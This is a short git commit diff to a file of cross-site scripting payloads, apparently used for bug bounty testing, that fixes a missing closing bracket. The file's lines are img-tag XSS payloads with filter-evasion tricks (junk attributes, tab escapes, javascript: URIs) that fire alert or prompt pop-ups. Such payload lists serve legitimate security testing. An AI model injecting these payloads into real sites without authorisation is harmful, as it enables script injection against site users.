506a09500ebf0104ed24df0a5c94f068af3cd460
Snowy <SnowyYT@protonmail.com>
2023-12-10 23:07:03 -0100

    Update DefaultImgPayloads.js

--- DefaultImgPayloads.js
+++ DefaultImgPayloads.js
@@ -5,4 +5,4 @@
 <img[a][b][c]src[d]=x[e]onerror=[f]"alert('HackerOne: SnowyY0_')">
 <img src\x09=x onerror="javascript:alert('HackerOne: SnowyY0_')">
 <IMG SRC="javascript:javascript:alert('HackerOne: SnowyY0_');">
-<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt('HackerOne: SnowyY0_')
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt('HackerOne: SnowyY0_')>
